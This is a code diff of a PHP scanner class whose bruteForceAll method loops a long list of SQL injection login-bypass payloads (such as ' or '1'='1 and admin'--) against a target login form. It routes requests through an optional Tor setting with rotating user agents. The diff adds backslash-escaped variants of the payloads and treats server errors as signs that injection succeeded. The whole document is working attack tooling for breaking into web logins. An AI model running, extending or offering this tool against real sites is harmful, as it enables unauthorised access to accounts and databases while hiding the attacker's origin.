@@ -111,39 +111,60 @@ class Site{
 	public function bruteForceAll($action,$method,$username,$password,$otherFields)
 	{
 
-
+		//echo "\n".$password;
 		$listForInjection=$this->listOfInjectionAdmin();
-
 		$pageControl="";
+		$sqlInjection=false;
+		$count0=0;
 		foreach($listForInjection as $keyInjetion=> $injetion)
 		{
-			echo ".";
+
+			echo $injetion;
+			echo "\n";
 			$username[key($username)]=$injetion;
 			$password[key($password)]=$injetion;
-			$dataToPost=array_merge($username,$password,$otherFields);
+			array(
+				'body' => array(
+					$username,
+					$password,
+				)
+			);
+			$dataToPost=['body'=>array_merge($username,$password,$otherFields)];
 			$client 	= new Client(['defaults' => [
 				'headers' => ['User-Agent' => $this->setUserAgent()],
 				$this->optionTor,
 				'timeout' => 30
 				]
 			]);
-
 			if(strcasecmp($method,'post')==0){
+
 				try{
-					$body = $client->post($action,array(),$dataToPost)->getBody()->getContents();
-					//$headers = $client->post($action,array(),$dataToPost)->getHeader();
-					$headers1 = $client->post($action,array(),$dataToPost)->getHeaders();
-					if($dataToPost['email']=="' or '1'='1"){
-						//var_dump($headers);
-						var_dump($headers1);
-						var_dump($dataToPost);exit();
-					}
+					$body = $client->post($action,$dataToPost)->getBody()->getContents();
 
 				}catch(\Exception $e){
-					if($e->getCode()=="404"){
-						echo $e->getCode()." - page not Found;";
+
+					if($e->getCode()=="500"){
+						$sqlInjection=true;
+						$obs="is probably sql injection";
+						$body=false;
 					}
-					break;
+					if($e->getCode()=="0")
+					{
+						$count0++;
+						if($count0==3)
+						{
+							$obs ="is probably break database";
+							$sqlInjection=true;
+						}
+						$sqlInjection=true;
+						//echo $e->getCode()." - page not Found;";
+					}
+					echo $e->getCode()." - page not Found;";
+
+					if($e->getCode()=="404"){
+						//echo $e->getCode()." - page not Found;";
+						break;
+					}
 
 				}
 
@@ -153,90 +174,146 @@ class Site{
 				}catch(\Exception $e){
 					if($e->getCode()=="404"){
 						echo $e->getCode()." - page not Found;";
+						break;
 					}
-					break;
 				}
 			}
 			if($keyInjetion==0)
 			{
-
 				$pageControl=$body;
 			}
 
-			if($pageControl!=$body )
+			if((isset($body) AND $pageControl!=$body) OR $sqlInjection)
 			{
-				var_dump($pageControl);
-				echo "sussefull...\n";
+				//var_dump($pageControl);
+				echo "...sussefull...\n";
 				$resultData['username']=$injetion;
 				$resultData['password']=$injetion;
+				if($sqlInjection){
+					$resultData['obs']=$obs;
+				}
+				$sqlInjection=false;
+				$count0=0;
+				echo "\n";
 				return $resultData;
 			}
+			//sleep(1);
 		}
+
 		return;
 	}
 
 	private function listOfInjectionAdmin()
 	{
 		$injection[]="zzaa44";
+		$injection[]="admin";
+		$injection[]="adm";
 		$injection[]="' or '1'='1";
+		$injection[]="\' or \'1\'=\'1";
 		$injection[]="' or 'x'='x";
+		$injection[]="\' or \'x\'=\'x";
 		$injection[]="' or 0=0 --";
+		$injection[]="\' or 0=0 --";
 		$injection[]='" or 0=0 --';
+		$injection[]='\" or 0=0 --';
 		$injection[]="or 0=0 --";
 		$injection[]='" or 0=0 #';
+		$injection[]='\" or 0=0 #';
 		$injection[]="or 0=0 #";
 		$injection[]="' or 'x'='x";
+		$injection[]="\' or \'x\'=\'x";
 		$injection[]='" or "x"="x';
+		$injection[]='\" or \"x\"=\"x';
 		$injection[]='" or 1=1--';
+		$injection[]='\" or 1=1--';
 		$injection[]='" or "a"="a';
+		$injection[]='\" or \"a\"=\"a';
 		$injection[]='") or ("a"="a';
+		$injection[]='\") or (\"a\"=\"a';
 		$injection[]='and 1=1';
 		$injection[]="') or ('x'='x";
+		$injection[]="\') or (\'x'=\'x";
 		$injection[]="' or 1=1--";
+		$injection[]="\' or 1=1--";
 		$injection[]="or 1=1--";
 		$injection[]="' or a=a--";
+		$injection[]="\' or a=a--";
 		$injection[]="') or ('a'='a";
+		$injection[]="\') or (\'a\'='a";
 		$injection[]="hi' or 1=1 --";
+		$injection[]="hi\' or 1=1 --";
 		$injection[]="'or'1=1'";
+		$injection[]="\'or\'1=1\'";
 		$injection[]="==";
 		$injection[]="and 1=1--";
 		$injection[]="' or 'one'='one--";
+		$injection[]="\' or \'one\'=\'one--";
 		$injection[]='hi" or "a"="a';
+		$injection[]='hi\" or \"a\"=\"a';
 		$injection[]='hi" or 1=1 --';
+		$injection[]='hi\" or 1=1 --';
 		$injection[]='" or 0=0 --';
+		$injection[]='\" or 0=0 --';
 		$injection[]='" or 0=0 #';
+		$injection[]='\" or 0=0 #';
 		$injection[]='" or "x"="x';
+		$injection[]='\" or \"x\"=\"x';
 		$injection[]='" or 1=1--';
+		$injection[]='\" or 1=1--';
 		$injection[]="' or 'one'='one";
+		$injection[]="\' or \'one\'=\'one";
 		$injection[]="' and 'one'='one";
+		$injection[]="\' and \'one\'=\'one";
 		$injection[]="' and 'one'='one--";
+		$injection[]="\' and \'one\'=\'one--";
 		$injection[]="1') and '1'='1--";
+		$injection[]="1\') and \'1\'=\'1--";
 		$injection[]=") or ('1'='1--";
+		$injection[]=") or (\'1\'=\'1--";
 		$injection[]=") or '1'='1--";
+		$injection[]=") or \'1\'=\'1--";
 		$injection[]="or 1=1/*";
 		$injection[]="or 1=1#";
 		$injection[]="or 1=1--";
 		$injection[]="admin'/*";
+		$injection[]="admin\'/*";
 		$injection[]="admin' #";
+		$injection[]="admin\' #";
 		$injection[]="admin' --";
+		$injection[]="admin\' --";
 		$injection[]="') or ('a'='a";
+		$injection[]="\') or (\'a\'=\'a";
 		$injection[]="' or a=a--";
+		$injection[]="\' or a=a--";
 		$injection[]="or 1=1--";
 		$injection[]="' or 1=1--";
+		$injection[]="\' or 1=1--";
 		$injection[]="') or ('x'='x";
+		$injection[]="\') or (\'x'=\'x";
 		$injection[]="' or 'x'='x";
+		$injection[]="\' or \'x\'=\'x";
 		$injection[]="or 0=0 #";
 		$injection[]="' or 0=0 #";
+		$injection[]="\' or 0=0 #";
 		$injection[]="or 0=0 --";
 		$injection[]="' or 0=0 --";
+		$injection[]="\' or 0=0 --";
 		$injection[]="' or 'x'='x";
+		$injection[]="\' or \'x\'=\'x";
 		$injection[]="' or '1'='1";
+		$injection[]="\' or \'1\'=\'1";
 		$injection[]='" or "a"="a';
+		$injection[]='\" or \"a\"=\"a';
 		$injection[]='") or ("a"="a';
+		$injection[]='\") or (\"a\"=\"a';
 		$injection[]='hi" or "a"="a';
+		$injection[]='hi\" or \"a\"=\"a';
 		$injection[]='hi" or 1=1 --';
+		$injection[]='hi\" or 1=1 --';
 		$injection[]="hi' or 1=1 --";
+		$injection[]="hi\' or 1=1 --";
 		$injection[]="'or'1=1'";
+		$injection[]="\'or\'1=1\'";
 
 		return $injection;
 	}
